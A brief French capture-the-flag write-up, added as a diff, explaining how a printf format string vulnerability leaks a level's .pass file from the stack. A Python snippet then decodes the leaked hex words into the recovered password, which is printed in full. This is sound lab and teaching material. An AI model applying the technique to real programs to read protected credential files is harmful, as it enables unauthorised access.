@@ -1,0 +1,16 @@
+On remarque que dans ce binaire il fait un printf avec un input comme le premier parametre donc on va abuser le format string vulnerability. on remarque que le contenu de /home/users/level03/.pass est sur la stack donc grace a format string vulnerability on va afficher les contenus de stack puis on va chercher le mot de pass.
+
+>>> def hex_to_string(arr):
+...     get_all = []
+...     for line in arr:
+...             splited_line = [line[i:i+2] for i in range(0, len(line),2)]
+...             get_all.append("".join([chr(int(x, 16)) for x in splited_line]))
+...     return (get_all)
+...
+
+>>> test1 = ["756e505234376848", "45414a3561733951", "377a7143574e6758", "354a35686e475873", "48336750664b394d"]
+>>> rev = [x[::-1] for x in hex_to_string(test1)]
+>>> rev
+['Hh74RPnu', 'Q9sa5JAE', 'XgNWCqz7', 'sXGnh5J5', 'M9KfPg3H']
+>>> "".join(rev)
+'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'
